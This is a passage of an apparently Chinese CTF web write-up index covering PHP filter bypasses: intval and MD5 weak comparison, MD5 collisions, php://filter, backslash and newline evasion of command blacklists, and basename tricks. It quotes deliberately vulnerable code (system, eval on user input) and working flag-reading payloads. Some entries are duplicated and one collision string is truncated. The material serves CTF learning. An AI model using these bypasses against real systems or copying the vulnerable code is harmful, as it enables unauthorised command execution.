<p>\u5728\u54cd\u5e94\u5934\u4e2d\u627e\u5230\u4e00\u4e2a\u63d0\u793a</p> <p></p> <p>\u8bbf\u95ee <code>fl4g.php</code> \u5f97\u5230</p> <pre><code>&lt;?php\nheader('Content-type:text/html;charset=utf-8');\nerror_reporting(0);\nhighlight_file(__file__);\n\n\n//level 1\nif (isset($_GET['num'])){\n    $num = $_GET['num'];\n    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021){\n        echo \"\u6211\u4e0d\u7ecf\u610f\u95f4\u770b\u4e86\u770b\u6211\u7684\u52b3\u529b\u58eb, \u4e0d\u662f\u60f3\u770b\u65f6\u95f4, \u53ea\u662f\u60f3\u4e0d\u7ecf\u610f\u95f4, \u8ba9\u4f60\u77e5\u9053\u6211\u8fc7\u5f97\u6bd4\u4f60\u597d.&lt;/br&gt;\";\n    }else{\n        die(\"\u91d1\u94b1\u89e3\u51b3\u4e0d\u4e86\u7a77\u4eba\u7684\u672c\u8d28\u95ee\u9898\");\n    }\n}else{\n    die(\"\u53bb\u975e\u6d32\u5427\");\n}\n//level 2\nif (isset($_GET['md5'])){\n   $md5=$_GET['md5'];\n   if ($md5==md5($md5))\n       echo \"\u60f3\u5230\u8fd9\u4e2aCTFer\u62ff\u5230flag\u540e, \u611f\u6fc0\u6d95\u96f6, \u8dd1\u53bb\u4e1c\u6f9c\u5cb8, \u627e\u4e00\u5bb6\u9910\u5385, \u628a\u53a8\u5e08\u8f70\u51fa\u53bb, \u81ea\u5df1\u7092\u4e24\u4e2a\u62ff\u624b\u5c0f\u83dc, \u5012\u4e00\u676f\u6563\u88c5\u767d\u9152, \u81f4\u5bcc\u6709\u9053, \u522b\u5b66\u5c0f\u66b4.&lt;/br&gt;\";\n   else\n       die(\"\u6211\u8d76\u7d27\u558a\u6765\u6211\u7684\u9152\u8089\u670b\u53cb, \u4ed6\u6253\u4e86\u4e2a\u7535\u8bdd, \u628a\u4ed6\u4e00\u5bb6\u5b89\u6392\u5230\u4e86\u975e\u6d32\");\n}else{\n    die(\"\u53bb\u975e\u6d32\u5427\");\n}\n\n//get flag\nif (isset($_GET['get_flag'])){\n    $get_flag = $_GET['get_flag'];\n    if(!strstr($get_flag,\" \")){\n        $get_flag = str_ireplace(\"cat\", \"wctf2020\", $get_flag);\n        echo \"\u60f3\u5230\u8fd9\u91cc, \u6211\u5145\u5b9e\u800c\u6b23\u6170, \u6709\u94b1\u4eba\u7684\u5feb\u4e50\u5f80\u5f80\u5c31\u662f\u8fd9\u4e48\u7684\u6734\u5b9e\u65e0\u534e, \u4e14\u67af\u71e5.&lt;/br&gt;\";\n        system($get_flag);\n    }else{\n        die(\"\u5feb\u5230\u975e\u6d32\u4e86\");\n    }\n}else{\n    die(\"\u53bb\u975e\u6d32\u5427\");\n}\n?&gt; \n</code></pre> <p><code>intval()</code> \u662f\u4e00\u4e2a\u7528\u4e8e\u5c06\u53d8\u91cf\u8f6c\u6362\u4e3a\u6574\u6570\u7684\u51fd\u6570\uff0c\u5e38\u7528\u4e8e\u6570\u636e\u7c7b\u578b\u8f6c\u6362\u548c\u8f93\u5165\u9a8c\u8bc1</p> <p>PHP 5 \u4e2d\u7684 <code>intval()</code> \u51fd\u6570\u4e2d\u79d1\u5b66\u8ba1\u6570\u6cd5\u7b26\u53f7 <code>e</code> \u65e0\u6548\uff0c\u53ea\u4f1a\u5f53\u4f5c\u6b63\u5e38\u5b57\u7b26\u5904\u7406</p> <p>\u56e0\u6b64\u5982\u679c\u8f93\u5165 100e2 \u4e4b\u7c7b\u7684\u6570\u636e\uff0c\u4f1a\u89e3\u91ca\u79f0 100\uff0c\u4f46\u540e\u9762\u5728\u6267\u884c +1 \u65f6\uff0c100e2 \u662f\u89e3\u91ca\u79f0 10000 \u7684\uff0c\u56e0\u6b64\u6b64\u5904\u4f7f\u7528 100e2 \u7ed5\u8fc7\uff0c\u7ed3\u679c\u5982\u4e0b</p> <pre><code>?num=100e2\n</code></pre>"},{"location":"Web/Chapter2/2-14/","title":"0e \u79d1\u5b66\u8ba1\u6570\u6cd5\u7ed5\u8fc7\u53cc\u91cd md5 \u5f31\u6bd4\u8f83","text":""},{"location":"Web/Chapter2/2-14/#0e-\u79d1\u5b66\u8ba1\u6570\u6cd5\u7ed5\u8fc7\u53cc\u91cd-md5-\u5f31\u6bd4\u8f83","title":"0e \u79d1\u5b66\u8ba1\u6570\u6cd5\u7ed5\u8fc7\u53cc\u91cd md5 \u5f31\u6bd4\u8f83","text":"<p>\u9996\u5148\u5728 <code>robots.txt</code> \u4e0b\u53d1\u73b0 <code>/fAke_f1agggg.php</code></p> <p></p> <p>\u5728\u54cd\u5e94\u5934\u4e2d\u627e\u5230\u4e00\u4e2a\u63d0\u793a</p> <p></p> <p>\u8bbf\u95ee <code>fl4g.php</code> \u5f97\u5230</p> <pre><code>&lt;?php\nheader('Content-type:text/html;charset=utf-8');\nerror_reporting(0);\nhighlight_file(__file__);\n\n\n//level 1\nif (isset($_GET['num'])){\n    $num = $_GET['num'];\n    if(intval($num) &lt; 2020 &amp;&amp; intval($num + 1) &gt; 2021){\n        echo \"\u6211\u4e0d\u7ecf\u610f\u95f4\u770b\u4e86\u770b\u6211\u7684\u52b3\u529b\u58eb, \u4e0d\u662f\u60f3\u770b\u65f6\u95f4, \u53ea\u662f\u60f3\u4e0d\u7ecf\u610f\u95f4, \u8ba9\u4f60\u77e5\u9053\u6211\u8fc7\u5f97\u6bd4\u4f60\u597d.&lt;/br&gt;\";\n    }else{\n        die(\"\u91d1\u94b1\u89e3\u51b3\u4e0d\u4e86\u7a77\u4eba\u7684\u672c\u8d28\u95ee\u9898\");\n    }\n}else{\n    die(\"\u53bb\u975e\u6d32\u5427\");\n}\n//level 2\nif (isset($_GET['md5'])){\n   $md5=$_GET['md5'];\n   if ($md5==md5($md5))\n       echo \"\u60f3\u5230\u8fd9\u4e2aCTFer\u62ff\u5230flag\u540e, \u611f\u6fc0\u6d95\u96f6, \u8dd1\u53bb\u4e1c\u6f9c\u5cb8, \u627e\u4e00\u5bb6\u9910\u5385, \u628a\u53a8\u5e08\u8f70\u51fa\u53bb, \u81ea\u5df1\u7092\u4e24\u4e2a\u62ff\u624b\u5c0f\u83dc, \u5012\u4e00\u676f\u6563\u88c5\u767d\u9152, \u81f4\u5bcc\u6709\u9053, \u522b\u5b66\u5c0f\u66b4.&lt;/br&gt;\";\n   else\n       die(\"\u6211\u8d76\u7d27\u558a\u6765\u6211\u7684\u9152\u8089\u670b\u53cb, \u4ed6\u6253\u4e86\u4e2a\u7535\u8bdd, \u628a\u4ed6\u4e00\u5bb6\u5b89\u6392\u5230\u4e86\u975e\u6d32\");\n}else{\n    die(\"\u53bb\u975e\u6d32\u5427\");\n}\n\n//get flag\nif (isset($_GET['get_flag'])){\n    $get_flag = $_GET['get_flag'];\n    if(!strstr($get_flag,\" \")){\n        $get_flag = str_ireplace(\"cat\", \"wctf2020\", $get_flag);\n        echo \"\u60f3\u5230\u8fd9\u91cc, \u6211\u5145\u5b9e\u800c\u6b23\u6170, \u6709\u94b1\u4eba\u7684\u5feb\u4e50\u5f80\u5f80\u5c31\u662f\u8fd9\u4e48\u7684\u6734\u5b9e\u65e0\u534e, \u4e14\u67af\u71e5.&lt;/br&gt;\";\n        system($get_flag);\n    }else{\n        die(\"\u5feb\u5230\u975e\u6d32\u4e86\");\n    }\n}else{\n    die(\"\u53bb\u975e\u6d32\u5427\");\n}\n?&gt; \n</code></pre> <p>PHP 5 \u4e2d\u7684 <code>intval()</code> \u51fd\u6570\u4e2d\u79d1\u5b66\u8ba1\u6570\u6cd5\u7b26\u53f7 <code>e</code> \u65e0\u6548\uff0c\u53ea\u4f1a\u5f53\u4f5c\u6b63\u5e38\u5b57\u7b26\u5904\u7406</p> <p>\u56e0\u6b64\u5982\u679c\u8f93\u5165 100e2 \u4e4b\u7c7b\u7684\u6570\u636e\uff0c\u4f1a\u89e3\u91ca\u79f0 100\uff0c\u4f46\u540e\u9762\u5728\u6267\u884c +1 \u65f6\uff0c100e2 \u662f\u89e3\u91ca\u79f0 10000 \u7684\uff0c\u56e0\u6b64\u6b64\u5904\u4f7f\u7528 100e2 \u7ed5\u8fc7\uff0c\u7ed3\u679c\u5982\u4e0b</p> <pre><code>?num=100e2\n</code></pre> <p>== \u5728\u6bd4\u8f83\u6570\u636e\u7684\u65f6\u5019\u4f1a\u8fdb\u884c\u7c7b\u578b\u7684\u8f6c\u6362\uff0c\u56e0\u6b64\u53ea\u9700\u8981\u67e5\u627e\u8fd9\u79cd\u6570\u636e\u5c31\u884c\uff0c\u6b64\u5904\u91c7\u7528\uff1a0e215962017</p> Plaintext MD5 Hash 0e215962017 0e291242476940776845150308577824"},{"location":"Web/Chapter2/2-15/","title":"filter \u4f2a\u534f\u8bae","text":""},{"location":"Web/Chapter2/2-15/#filter-\u4f2a\u534f\u8bae","title":"filter \u4f2a\u534f\u8bae","text":"<p>\u6253\u5f00\u7f51\u9875\u7ed9\u51fa\u4e86\u6e90\u7801</p> <p></p> <p>\u8981\u4f20\u53c2 $text \u662f\u4e2a\u6587\u4ef6\uff0c\u800c\u4e14\u6587\u4ef6\u5185\u5bb9\u662f I have\u2026\u2026</p> <p>\u8fd9\u91cc\u53ef\u4ee5\u8054\u60f3\u5230 PHP \u4f2a\u534f\u8bae input\uff0c\u5176 POST \u7684\u503c\u662f I have\u2026\u2026 \u5373\u53ef\u7ed5\u8fc7\uff08data \u4e5f\u53ef\u4ee5\uff09</p> <p>$file \u6700\u540e\u662f\u6587\u4ef6\u5305\u542b\uff0c\u4e5f\u662f\u8981\u4f20\u6587\u4ef6\u540d\u7684</p> <p>\u8054\u60f3\u5230\u53e6\u4e00\u4e2a PHP \u4f2a\u534f\u8bae filter\uff0c\u6ce8\u91ca\u8868\u660e\u4e86\u4e00\u4e2a\u6587\u4ef6\uff0c\u6784\u9020 payload \u6267\u884c</p> <p></p> <p>\u89e3\u7801\u62ff\u5230\u6587\u4ef6\u6e90\u7801</p> <pre><code>&lt;?php\n$id = $_GET['id'];\n$_SESSION['id'] = $id;\n\nfunction complex($re, $str) {\n    return preg_replace(\n        '/(' . $re . ')/ei',\n        'strtolower(\"\\\\1\")',\n        $str\n    );\n}\n\n\nforeach($_GET as $re =&gt; $str) {\n    echo complex($re, $str). \"\\n\";\n}\n\nfunction getFlag(){\n    @eval($_GET['cmd']);\n}\n</code></pre>"},{"location":"Web/Chapter2/2-16/","title":"MD5 \u5f3a\u78b0\u649e","text":""},{"location":"Web/Chapter2/2-16/#md5-\u5f3a\u78b0\u649e","title":"MD5 \u5f3a\u78b0\u649e","text":"<p>\u6253\u5f00\u7f51\u9875\u6709\u4e24\u4e2a URL \u53c2\u6570\uff0c\u5176\u4e2d\u4e00\u4e2a\u662f\u56fe\u7247\u7684</p> <p></p> <p>\u5c06\u53c2\u6570\u4e24\u6b21 Base64 \u89e3\u7801\u540e\u518d Hex \u89e3\u7801\u62ff\u5230\u539f\u56fe\u7247\u540d</p> <p></p> <p>\u5c06\u53c2\u6570\u6362\u6210\u7f16\u7801\u540e\u7684 index.php</p> <p>\u53f3\u952e\u56fe\u7247\u94fe\u63a5\u590d\u5236\u53c2\u6570</p> <p></p> <p>Base64 \u89e3\u7801\u62ff\u5230 flag</p> <pre><code>&lt;?php\nerror_reporting(E_ALL || ~ E_NOTICE);\nheader('content-type:text/html;charset=utf-8');\n$cmd = $_GET['cmd'];\nif (!isset($_GET['img']) || !isset($_GET['cmd'])) \n    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=');\n$file = hex2bin(base64_decode(base64_decode($_GET['img'])));\n\n$file = preg_replace(\"/[^a-zA-Z0-9.]+/\", \"\", $file);\nif (preg_match(\"/flag/i\", $file)) {\n    echo '&lt;img src =\"./ctf3.jpeg\"&gt;';\n    die(\"xixi\uff5e no flag\");\n} else {\n    $txt = base64_encode(file_get_contents($file));\n    echo \"&lt;img src='data:image/gif;base64,\" . $txt . \"'&gt;&lt;/img&gt;\";\n    echo \"&lt;br&gt;\";\n}\necho $cmd;\necho \"&lt;br&gt;\";\nif (preg_match(\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|&lt;|&gt;/i\", $cmd)) {\n    echo(\"forbid ~\");\n    echo \"&lt;br&gt;\";\n} else {\n    if ((string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b'])) {\n        echo `$cmd`;\n    } else {\n        echo (\"md5 is funny ~\");\n    }\n}\n\n?&gt;\n&lt;html&gt;\n&lt;style&gt;\n  body{\n   background:url(./bj.png)  no-repeat center center;\n   background-size:cover;\n   background-attachment:fixed;\n   background-color:#CCCCCC;\n}\n&lt;/style&gt;\n&lt;body&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>\u9700\u8981\u7ed5\u8fc7\u5f3a\u6bd4\u8f83</p> <pre><code>(string)$_POST['a'] !== (string)$_POST['b'] &amp;&amp; md5($_POST['a']) === md5($_POST['b'])\n</code></pre> <p>\u9700\u8981\u627e\u5230\u4e24\u4e2a\u4e0d\u540c\u7684\u5b57\u7b26\u4f46\u662f\u4ed6\u4eec\u7684 md5 \u503c\u662f\u76f8\u540c\u7684</p> <p>\u6ce8\u610f\u4e00\u70b9\uff0cPOST \u65f6\u4e00\u5b9a\u8981 urlencode\uff01\uff01\uff01</p> <pre><code>#1\na=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2   \nb=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2   \n#2\na=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2   \nb=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%\n#3\n$a=\"\\x4d\\xc9\\x68\\xff\\x0e\\xe3\\x5c\\x20\\x95\\x72\\xd4\\x77\\x7b\\x72\\x15\\x87\\xd3\\x6f\\xa7\\xb2\\x1b\\xdc\\x56\\xb7\\x4a\\x3d\\xc0\\x78\\x3e\\x7b\\x95\\x18\\xaf\\xbf\\xa2\\x00\\xa8\\x28\\x4b\\xf3\\x6e\\x8e\\x4b\\x55\\xb3\\x5f\\x42\\x75\\x93\\xd8\\x49\\x67\\x6d\\xa0\\xd1\\x55\\x5d\\x83\\x60\\xfb\\x5f\\x07\\xfe\\xa2\";\n$b=\"\\x4d\\xc9\\x68\\xff\\x0e\\xe3\\x5c\\x20\\x95\\x72\\xd4\\x77\\x7b\\x72\\x15\\x87\\xd3\\x6f\\xa7\\xb2\\x1b\\xdc\\x56\\xb7\\x4a\\x3d\\xc0\\x78\\x3e\\x7b\\x95\\x18\\xaf\\xbf\\xa2\\x02\\xa8\\x28\\x4b\\xf3\\x6e\\x8e\\x4b\\x55\\xb3\\x5f\\x42\\x75\\x93\\xd8\\x49\\x67\\x6d\\xa0\\xd1\\xd5\\x5d\\x83\\x60\\xfb\\x5f\\x07\\xfe\\xa2\";\n</code></pre> <p>\u5173\u952e\u8bcd\u88ab\u8fc7\u6ee4\u4e86\u53ef\u4ee5\u4f7f\u7528\u53cd\u659c\u6760  \u7ed5\u8fc7</p> <pre><code>l\\s%20/\nca\\t%20/flag\n.......\n</code></pre> <p></p>"},{"location":"Web/Chapter2/2-17/","title":"\u6362\u884c\u7b26\u7ed5\u8fc7 preg_match()","text":""},{"location":"Web/Chapter2/2-17/#\u6362\u884c\u7b26\u7ed5\u8fc7-preg_match","title":"\u6362\u884c\u7b26\u7ed5\u8fc7 preg_match()","text":"<p>\u6253\u5f00\u7f51\u9875\u9700\u8981 JSON \u683c\u5f0f\u8f93\u5165</p> <p></p> <p>\u8f93\u5165 <code>{\"cmd\":\"ls\"}</code>\uff0c\u53ea\u6709\u4e00\u4e2a index,php\uff0c\u800c\u4e14\u4e0d\u80fd\u8bfb\u53d6</p> <p></p> <p>\u7f51\u7ad9\u6e90\u7801\u5982\u4e0b\uff1a</p> <pre><code>&lt;?php\n\nputenv('PATH=/home/rceservice/jail');\n\nif (isset($_REQUEST['cmd'])) {\n  $json = $_REQUEST['cmd'];\n\n  if (!is_string($json)) {\n    echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;';\n  } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/', $json)) {\n    echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;';\n  } else {\n    echo 'Attempting to run command:&lt;br/&gt;';\n    $cmd = json_decode($json, true)['cmd'];\n    if ($cmd !== NULL) {\n      system($cmd);\n    } else {\n      echo 'Invalid input';\n    }\n    echo '&lt;br/&gt;&lt;br/&gt;';\n  }\n}\n\n?&gt;\n</code></pre> <p>\u8fc7\u6ee4\u7684\u5f88\u4e25\uff0c\u4f46\u662f\u53ef\u4ee5\u7ed5\u8fc7 preg_match() \u51fd\u6570\u672c\u8eab</p> <p>\u56e0\u4e3a preg_match() \u53ea\u4f1a\u53bb\u5339\u914d\u7b2c\u4e00\u884c\uff0c\u6240\u4ee5\u8fd9\u91cc\u53ef\u4ee5\u7528\u591a\u884c\u8fdb\u884c\u7ed5\u8fc7</p> <p>\u8fd9\u884c\u4ee3\u7801\u5df2\u7ecf\u4fee\u6539\u4e86\u73af\u5883\u53d8\u91cf\uff0c\u6211\u4eec\u53ea\u80fd\u7528\u7edd\u5bf9\u8def\u5f84\u6765\u8c03\u7528\u7cfb\u7edf\u547d\u4ee4</p> <pre><code>putenv('PATH=/home/rceservice/jail');\n</code></pre> <p>cat \u547d\u4ee4\u5728 /bin \u4e2d\u4fdd\u5b58</p> <p>\u6240\u4ee5\u6784\u9020\u51fa payload \uff0c%0A \u662f\u6362\u884c\u7b26</p> <pre><code>{%0A\"cmd\": \"/bin/cat /home/rceservice/flag\"%0A}\n</code></pre>"},{"location":"Web/Chapter2/2-18/","title":"/bin \u7ed5\u8fc7\u73af\u5883\u53d8\u91cf","text":""},{"location":"Web/Chapter2/2-18/#bin-\u7ed5\u8fc7\u73af\u5883\u53d8\u91cf","title":"/bin \u7ed5\u8fc7\u73af\u5883\u53d8\u91cf","text":"<p>\u6253\u5f00\u7f51\u9875\u9700\u8981 JSON \u683c\u5f0f\u8f93\u5165</p> <p></p> <p>\u8f93\u5165 <code>{\"cmd\":\"ls\"}</code>\uff0c\u53ea\u6709\u4e00\u4e2a index,php\uff0c\u800c\u4e14\u4e0d\u80fd\u8bfb\u53d6</p> <p></p> <p>\u7f51\u7ad9\u6e90\u7801\u5982\u4e0b\uff1a</p> <pre><code>&lt;?php\n\nputenv('PATH=/home/rceservice/jail');\n\nif (isset($_REQUEST['cmd'])) {\n  $json = $_REQUEST['cmd'];\n\n  if (!is_string($json)) {\n    echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;';\n  } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/', $json)) {\n    echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;';\n  } else {\n    echo 'Attempting to run command:&lt;br/&gt;';\n    $cmd = json_decode($json, true)['cmd'];\n    if ($cmd !== NULL) {\n      system($cmd);\n    } else {\n      echo 'Invalid input';\n    }\n    echo '&lt;br/&gt;&lt;br/&gt;';\n  }\n}\n\n?&gt;\n</code></pre> <p>\u8fc7\u6ee4\u7684\u5f88\u4e25\uff0c\u4f46\u662f\u53ef\u4ee5\u7ed5\u8fc7 preg_match() \u51fd\u6570\u672c\u8eab</p> <p>\u56e0\u4e3a preg_match() \u53ea\u4f1a\u53bb\u5339\u914d\u7b2c\u4e00\u884c\uff0c\u6240\u4ee5\u8fd9\u91cc\u53ef\u4ee5\u7528\u591a\u884c\u8fdb\u884c\u7ed5\u8fc7</p> <p>\u8fd9\u884c\u4ee3\u7801\u5df2\u7ecf\u4fee\u6539\u4e86\u73af\u5883\u53d8\u91cf\uff0c\u6211\u4eec\u53ea\u80fd\u7528\u7edd\u5bf9\u8def\u5f84\u6765\u8c03\u7528\u7cfb\u7edf\u547d\u4ee4</p> <pre><code>putenv('PATH=/home/rceservice/jail');\n</code></pre> <p>cat \u547d\u4ee4\u5728 /bin \u4e2d\u4fdd\u5b58</p> <p>\u6240\u4ee5\u6784\u9020\u51fa payload \uff0c%0A \u662f\u6362\u884c\u7b26</p> <pre><code>{%0A\"cmd\": \"/bin/cat /home/rceservice/flag\"%0A}\n</code></pre>"},{"location":"Web/Chapter2/2-19/","title":"ff \u7ed5\u8fc7 basename()","text":""},{"location":"Web/Chapter2/2-19/#ff-\u7ed5\u8fc7-basename","title":"%ff \u7ed5\u8fc7 basename()","text":"<p>\u6253\u5f00\u9875\u9762\u6709\u4e00\u4e2a\u67e5\u770b\u6e90\u7801</p> <p></p> <p>\u62ff\u5230\u6e90\u7801</p> <pre><code>&lt;?php\ninclude 'config.php'; // FLAG is defined in config.php\n\nif (preg_match('/config\\.php\\/*$/i', $_SERVER['PHP_SELF'])) {\n  exit(\"I don't know what you are thinking, but I won't let you read it :)\");\n}\n\nif (isset($_GET['source'])) {\n  highlight_file(basename($_SERVER['PHP_SELF']));\n  exit();\n}\n\n$secret = bin2hex(random_bytes(64));\nif (isset($_POST['guess'])) {\n  $guess = (string) $_POST['guess'];\n  if (hash_equals($secret, $guess)) {\n    $message = 'Congratulations! The flag is: ' . FLAG;\n  } else {\n    $message = 'Wrong.';\n  }\n}\n?&gt;\n&lt;!doctype html&gt;\n&lt;html lang=\"en\"&gt;\n  &lt;head&gt;\n    &lt;meta charset=\"utf-8\"&gt;\n    &lt;title&gt;Can you guess it?&lt;/title&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;h1&gt;Can you guess it?&lt;/h1&gt;\n    &lt;p&gt;If your guess is correct, I'll give you the flag.&lt;/p&gt;\n    &lt;p&gt;&lt;a href=\"?source\"&gt;Source&lt;/a&gt;&lt;/p&gt;\n    &lt;hr&gt;\n&lt;?php if (isset($message)) { ?&gt;\n    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;\n&lt;?php } ?&gt;\n    &lt;form action=\"index.php\" method=\"POST\"&gt;\n      &lt;input type=\"text\" name=\"guess\"&gt;\n      &lt;input type=\"submit\"&gt;\n    &lt;/form&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>\u6ce8\u91ca\u6307\u660e flag \u5728 <code>config.php</code> \u4e2d</p> <p>\u4f46\u662f\u53ef\u4ee5\u7559\u610f\u5230\u663e\u793a\u6e90\u7801\u7684\u903b\u8f91\u90e8\u5206\u6545\u4f5c\u7384\u865a\u6ca1\u6709\u4f7f\u7528\u7b80\u6d01\u7684 <code>__FILE__</code> \u800c\u662f\u91c7\u7528 <code>basename</code> \u51fd\u6570\u622a\u53d6 <code>$_SERVER['PHP_SELF']</code>\uff0c\u672c\u9898\u7684\u5229\u7528\u70b9\u4e5f\u5c31\u5728\u6b64\u5904</p> <p><code>$_SERVER['PHP_SELF']</code> \u4f1a\u83b7\u53d6\u6211\u4eec\u5f53\u524d\u7684\u8bbf\u95ee\u8def\u5f84\uff0c\u5e76\u4e14 PHP \u5728\u6839\u636e URL \u89e3\u6790\u5230\u5bf9\u5e94\u6587\u4ef6\u540e\u4f1a\u5ffd\u7565\u6389 URL \u4e2d\u591a\u4f59\u7684\u90e8\u5206</p> <p>\u5373\u82e5\u8bbf\u95ee\u5b58\u5728\u7684 index.php \u9875\u9762\uff0c\u5982\u4e0b\u4e24\u79cd URL \u5747\u4f1a\u8bbf\u95ee\u5230</p> <pre><code>/index.php\n/index.php/dosent_exist.php\n</code></pre> <p><code>basename</code> \u53ef\u4ee5\u7406\u89e3\u4e3a\u5bf9\u4f20\u5165\u7684\u53c2\u6570\u8def\u5f84\u622a\u53d6\u6700\u540e\u4e00\u6bb5\u4f5c\u4e3a\u8fd4\u56de\u503c\uff0c\u4f46\u662f\u8be5\u51fd\u6570\u53d1\u73b0\u6700\u540e\u4e00\u6bb5\u4e3a\u4e0d\u53ef\u89c1\u5b57\u7b26\u65f6\u4f1a\u9000\u53d6\u4e0a\u4e00\u5c42\u7684\u76ee\u5f55</p> <pre><code>$var1=\"/config.php/test\"\nbasename($var1) =&gt; test\n\n$var2=\"/config.php/%ff\"\nbasename($var2) =&gt;  config.php\n</code></pre> <p>\u901a\u8fc7\u6784\u9020 URL \u8ba9\u5176\u5305\u542b <code>config.php</code> \u8fd9\u4e2a\u6587\u4ef6\u540d\u518d\u8ba9 <code>basename</code> \u51fd\u6570\u622a\u53d6\u51fa\u6765</p> <p>\u4e4b\u540e\u901a\u8fc7\u8bf7\u6c42\u53c2\u6570 <code>source</code> \u5c31\u80fd\u663e\u793a <code>config.php</code> \u7684\u6e90\u7801\uff0c\u4e5f\u5c31\u80fd\u89c1\u5230 <code>flag</code></p> <p></p>"},{"location":"Web/Chapter2/2-2/","title":"\u53cc\u5199\u7ed5\u8fc7 str_replace()","text":""},{"location":"Web/Chapter2/2-2/#\u53cc\u5199\u7ed5\u8fc7-str_replace","title":"\u53cc\u5199\u7ed5\u8fc7 str_replace()","text":"<p>\u7ee7\u4e0a\u4e00\u8282 .bak \u6587\u4ef6\u6cc4\u9732\u540e\u6211\u4eec\u62ff\u5230\u4e86\u6e90\u7801</p> <p></p> <p>\u524d\u534a\u90e8\u5206\u662f\u8fc7\u6ee4\u4e86 key \u53c2\u6570\uff0cstr_replace() \u51fd\u6570\u66ff\u6362\u5b57\u7b26\u4e32\u4e2d\u7684\u4e00\u4e9b\u5b57\u7b26\uff08\u533a\u5206\u5927\u5c0f\u5199\uff09</p> <p></p> <p>\u4f46\u662f\u540e\u90e8\u5206\u9700\u8981 key \u53c2\u6570\uff0c\u6240\u4ee5\u91c7\u7528\u53cc\u5199\u7ed5\u8fc7</p> <p>\u539f\u7406\u662f\u51fd\u6570\u4f1a\u8fc7\u6ee4\u6389\u5b57\u7b26 world \u4e3a\u7a7a\uff0c\u90a3\u4e48\u6211\u4eec\u53cc\u5199\u8f93\u5165\u7684\u4ee3\u7801\u5c31\u662f woworldrld\uff0c\u4f1a\u81ea\u52a8\u62fc\u63a5\u5728\u4e00\u8d77\u5f62\u6210\u65b0\u7684 world</p> <p></p>"},{"location":"Web/Chapter2/2-20/","title":". \u548c + \u66ff\u6362 _","text":""},{"location":"Web/Chapter2/2-20/#-\u548c--\u66ff\u6362-_","title":". \u548c + \u66ff\u6362 _","text":"<p>\u6253\u5f00\u7f51\u9875\u67e5\u770b\u6e90\u4ee3\u7801\u7ed9\u51fa\u4e86\u6e90\u7801</p> <p></p> <p><code>$_SERVER['QUERY_STRING']</code> \u6307\u7684\u662f\u67e5\u8be2\u7684\u5b57\u7b26\u4e32\uff0c\u5373\u5730\u5740\u680f <code>?</code> \u4e4b\u540e\u7684\u90e8\u5206</p> <p><code>%5f</code> \u6307\u7684\u662f <code>_</code> \uff0c\u90a3\u5c31\u662f\u67e5\u8be2\u7684\u5b57\u7b26\u4e32\u4e2d\u4e0d\u80fd\u5b58\u5728 <code>_</code></p> <p>PHP \u5728\u89e3\u6790\u5b57\u7b26\u4e32\u65f6\u4f1a\u628a\u70b9\u548c\u7a7a\u683c\u89e3\u6790\u6210 <code>_</code>\uff0c\u56e0\u6b64\u7b2c\u4e00\u4e2a\u5224\u65ad\u53ef\u4ee5\u4f7f\u7528 b.u.p.t \u6216 b+u+p+t \u6765\u8fdb\u884c\u7ed5\u8fc7</p> <p>\u7b2c\u4e8c\u4e2a\u5224\u65ad\u53ef\u4ee5\u7528\u6362\u884c\u7b26\u7ed5\u8fc7 preg_match()</p> <pre><code>?b+u+p+t=23333%0a\n</code></pre> <p></p>"},{"location":"Web/Chapter2/2-21/","title":"\u5927\u5c0f\u5199\u7ed5\u8fc7 strstr()","text":""},{"location":"Web/Chapter2/2-21/#\u5927\u5c0f\u5199\u7ed5\u8fc7-strstr","title":"\u5927\u5c0f\u5199\u7ed5\u8fc7 